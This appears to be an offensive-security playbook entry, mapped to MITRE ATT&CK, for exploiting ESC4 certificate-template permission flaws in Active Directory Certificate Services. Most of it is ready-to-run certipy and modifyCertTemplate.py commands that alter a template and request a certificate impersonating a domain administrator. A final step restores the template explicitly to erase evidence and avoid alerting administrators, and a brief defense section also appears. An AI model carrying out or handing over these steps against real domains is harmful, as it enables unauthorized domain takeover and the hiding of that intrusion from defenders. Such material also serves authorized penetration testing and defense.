---
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Abuse Elevation Control Mechanism|T1548 - Abuse Elevation
    Control Mechanism]]
sub_techniques:
  - >-
    [[sub-techniques/Bypass User Account Control|T1548.002 - Bypass User Account
    Control]]
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Active Directory Certificate Services]]'
  - '[[tags/ESC4 - Access Control Vulnerabilities]]'
commands:
  - '[[commands/get-certificate-template-acl]]'
  - '[[commands/add-enrollee-supplies-subject-flag]]'
  - '[[commands/set-certificate-name-flag-to-zero]]'
  - '[[commands/configure-esc1-vulnerability]]'
  - '[[commands/request-certificate-with-esc4-template]]'
  - '[[commands/restore-old-configuration]]'
platforms:
  - Windows
tools:
  - '[[tools/certipy]]'
validated: true
---

# Active-Directory-Certificate-Services-Access-Control-Vulnerabilities

## Summary

This procedure exploits access control vulnerabilities in Active Directory Certificate Services (AD CS), specifically focusing on ESC4 scenarios, to achieve privilege escalation. By modifying certificate templates to enable vulnerable configurations (such as adding the ENROLLEE_SUPPLIES_SUBJECT flag or setting name flags to zero), an attacker with low-privileged access can request certificates impersonating high-privilege accounts like domain administrators, bypassing standard authentication controls.

## Description

Active Directory Certificate Services (AD CS) allows organizations to issue digital certificates for authentication and encryption. However, misconfigurations in access controls on certificate templates can allow unauthorized users to enroll in templates that grant excessive privileges. This procedure covers identifying and exploiting such vulnerabilities, including configuring templates for ESC1-like conditions using an ESC4 template, requesting impersonation certificates, and restoring configurations to maintain stealth. It targets Windows domain environments with AD CS deployed and is particularly effective against templates where low-privileged users have write permissions. Success enables domain admin access via certificate-based authentication, evading traditional credential checks.

## Requirements

1. Authenticated access to the Active Directory domain (low-privileged user account sufficient if template permissions allow).
2. Network access to the domain controller (DC) and Certificate Authority (CA) server.
3. Installed tools: Certipy (Python-based) and modifyCertTemplate.py script.
4. Knowledge of target domain details, including usernames, template names, and CA hostname.
5. Hash or password for the authenticating account.

## Defense

- Implement least privilege access controls on AD CS templates, restricting write/enroll permissions to necessary groups.
- Regularly audit and review certificate template permissions using tools like Certify or PowerView.
- Monitor AD CS event logs (Event ID 4886 for certificate requests, 4887 for approvals) for anomalous enrollments.
- Enable advanced auditing on LDAP modifications to templates and restrict template editing to domain admins.

## Objectives

1. Identify and modify vulnerable certificate templates to enable privilege escalation paths.
2. Request certificates that allow impersonation of high-privilege accounts.
3. Achieve persistence or lateral movement using the obtained certificates while minimizing detection.

## Instructions

### Step 1: Retrieve ACL for Certificate Template

**Context**: First, query the access control list (ACL) on the target certificate template to verify if the current user has sufficient permissions (e.g., WriteProperty or GenericAll) to modify it, which is a prerequisite for exploitation.

**Command** ([[commands/get-certificate-template-acl]]):
```bash
python3 modifyCertTemplate.py $_DOMAIN/$_USERNAME -k -no-pass -template $_TEMPLATE_NAME -dc-ip $_DC_IP -get-acl
```

> This command uses the modifyCertTemplate.py script to fetch the ACL via LDAP. Replace placeholders with actual values (e.g., domain.local/user, 'User', 10.10.10.10). Look for entries granting 'WriteProperty' to low-privileged groups like 'Everyone' or the attacker's group, indicating vulnerability.

### Step 2: Add ENROLLEE_SUPPLIES_SUBJECT Flag

**Context**: If permissions allow, add the ENROLLEE_SUPPLIES_SUBJECT (ESS) flag to the template's mspki-Certificate-Name-Flag property. This enables the enrollee to supply the subject name, allowing impersonation in subsequent certificate requests (enabling ESC1 exploitation).

**Command** ([[commands/add-enrollee-supplies-subject-flag]]):
```bash
python3 modifyCertTemplate.py $_DOMAIN/$_USERNAME -k -no-pass -template $_TEMPLATE_NAME -dc-ip $_DC_IP -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag
```

> Run this after confirming write access. Alternatively, on Windows, use StandIn.exe for the same effect: `StandIn.exe --adcs --filter $_TEMPLATE_NAME --ess --add`. Success modifies the template flags, verifiable by re-running the ACL query.

### Step 3: Set Certificate Name Flag to Zero

**Context**: Modify the mspki-Certificate-Name-Flag property to 0, which forces the certificate subject to use the UPN format and can create conditions for bypassing name restrictions in enrollment (part of ESC1 configuration).

**Command** ([[commands/set-certificate-name-flag-to-zero]]):
```bash
python3 modifyCertTemplate.py $_DOMAIN/$_USERNAME -k -no-pass -template $_TEMPLATE_NAME -dc-ip $_DC_IP -value 0 -property mspki-Certificate-Name-Flag
```

> This sets the flag value explicitly. Perform this after adding the ESS flag if chaining exploits. Restore the original value post-exploitation to avoid alerting admins.

### Step 4: Configure Template for ESC1 Vulnerability Using ESC4

**Context**: Overwrite the template configuration to mimic an ESC1 vulnerability while leveraging an existing ESC4 template. This saves the original config for later restoration.

**Command** ([[commands/configure-esc1-vulnerability]]):
```bash
certipy template '$_DOMAIN/$_MACHINE_ACCOUNT@$_CA_HOSTNAME' -hashes $_HASH -template '$_TEMPLATE_NAME' -save-old
```

> Use machine account credentials (hash format). This backs up the config to a JSON file and applies vulnerable settings.

### Step 5: Request Impersonation Certificate with ESC4 Template

**Context**: With the vulnerable configuration, request a certificate impersonating a high-privilege account (e.g., administrator) using the modified ESC4 template.

**Command** ([[commands/request-certificate-with-esc4-template]]):
```bash
certipy req '$_DOMAIN/$_USERNAME:$_PASSWORD@$_CA_HOSTNAME' -ca '$_CA_NAME' -template '$_TEMPLATE_NAME' -alt '$_TARGET_UPN'
```

> Specify the target UPN (e.g., administrator@domain.local) in -alt to impersonate. The resulting certificate can be used for authentication.

### Step 6: Restore Original Template Configuration

**Context**: After obtaining the certificate, restore the original template settings to erase evidence of modifications.

**Command** ([[commands/restore-old-configuration]]):
```bash
certipy template '$_DOMAIN/$_MACHINE_ACCOUNT@$_CA_HOSTNAME' -hashes $_HASH -template '$_TEMPLATE_NAME' -configuration $_BACKUP_JSON
```

> Use the saved JSON from Step 4 to revert changes, maintaining operational security.
